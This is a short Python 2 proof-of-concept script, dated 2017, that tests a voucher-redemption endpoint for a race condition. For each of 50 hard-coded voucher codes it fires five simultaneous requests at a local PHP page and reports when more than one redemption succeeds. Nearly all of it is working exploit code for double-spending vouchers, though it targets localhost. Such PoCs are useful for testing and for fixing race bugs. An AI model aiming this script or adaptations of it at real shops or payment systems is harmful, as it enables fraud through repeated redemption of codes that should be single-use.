import time, threading
import urllib2
vouchers = ("753bf3337773218a6dbe14bf483f11e2fc61c095", "dc909c7da122163502eb51656f8045ad2966c318", "63d07defb726c4f97ef933043a5c2057bc81e4eb", "43c3129880d9b8f5a9b9ee341660610508a082d1", "d0ea3dec662056c1f7a8a4b702210ae4c8d36fc9", "e84a23d6404f83b517ac5accabb9db5d7b66e0a7", 
            "a5dcd1863f16b7f263d1016a5aa579a08c159892", "c949db75f044eab51fbe8b738c1bbb56331f4946", "9aa81b248e964041c8e722e16eb84da2100a563e", "19c19c7874d883b3d40e674d0819550a05669106", "624751bcd03e3403efe04f5fa7e0dcaf618d61d9", "1cb75c5f3b52a8082f28d79416bb579c7d792e7c", "f8100fecac90522f660fd991732c88b2cb8b2454", "7b5e400464b67ad3c2f96202c04b68797b6a1707", "e5a87c350b4eea298ca3920b0e04adde396fa859", "1a27030b325e8c8ac7d04a759fdf4464dd205dde", "6306ee39af7a6d0d8176e4c37e4960f317b5a004", "ec7792629a96ee4d8e817db0ec1fb0382e44243f", "c347125c9befaa69d28bb4e84942d40f9e0b751e", "ad17b1ea55bccdfcdce8946c9dea10bacae6b695", "5c83cf6dded73a62b3be840c8d50ec59c214e1df", "188fbae6c28e1eed41f96e1731490196117781e4", "0ffb28e3a5bd762124c809ebb6426d841d9fac5c", "01d4a66c162bf774759ba736bce6be4bbf0e430d", "96f4b3388d917ff0c4e4e2974b438fb4cf91273d", "9b27a1a634f364e191be9f040dd479ac567a2911", "c849e97da9291d8c22b985f4dae4749e4962f51e", "ca9ed9a50d497135c0347a96b6be21a3d24d6c1c", "7174e62180945316bef53ba703bb7af278a276f8", "3de7c044967243707a7dece9fef69688fc353652", "524d2a4b5cefde146dcf20548518fe79caffe8a1", "2a884ba6e06b7bf59bfcf780b376526f476adc72", "0bebcdb25d3566306e9ccab59cbdeb9fbd01084e", "37d5a6ed42c8adffdf676154dc22d24e609017ae", "7295cc4950dcd78fc4dbb376ba54c18911691a6d", "73493233269f16659345c34c8df05b9cac403a8d", "7e5cead9b9a77e175aef6c9fbb85716e7b07a7c8", "2c830d93cdaa159e7666dc7866f40a771fdc45c3", "92e52f2dc711b3bb7268f5c22b87822915ee9868", "3b5ad2552f5fcdfe7103522d5ab08ace86f1ea83", "be845810a46c966834811754cbfec41b8e66213b", "aaaae2695baf2008b5a36a2271c03a7820ccdb23", "d6737a1a34ce36fbd49edd44f366dfb33f7efd5b", "c491e4499714e8fb51d981fe238733ae3b65ee53", "d1462ce25ff607060869b9aa29472349c16a18b6", "8b0172bdc3a8c42c7d94b029b976b3b4a8ca86e7", "5bed9ee7377f008f337c5de64631605c321b515c", "48a28dedb22a608b282dcaab3955354e45c5c47e", "c87521e807999607496967f6ecc9f9b26f059536", "9646e090634565e3cff4549d6989e01ab058c4ed")

url = "http://localhost/test_voucher.php?voucher={}"
race = 0
print "Voucher race condition PoC - 14/01/2017 - JoseCarlosGarcia95"

def racecondition(url):
    global race
    html = urllib2.urlopen(url).read()

    if html == "OK":
        race = race + 1
for voucher in vouchers:
    print "Voucher: " + voucher
    threads = list()
    race = 0
    for i in range(0, 5):
        t = threading.Thread(target=racecondition, args=(url.format(voucher),))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    if(race > 1):
        print "[{}] : I won the race! [{}/5] >:)".format(voucher, race)
    else:
        print "[{}] : Not this time! :-(".format(voucher)
    
    print "Waiting..."
    time.sleep(5)
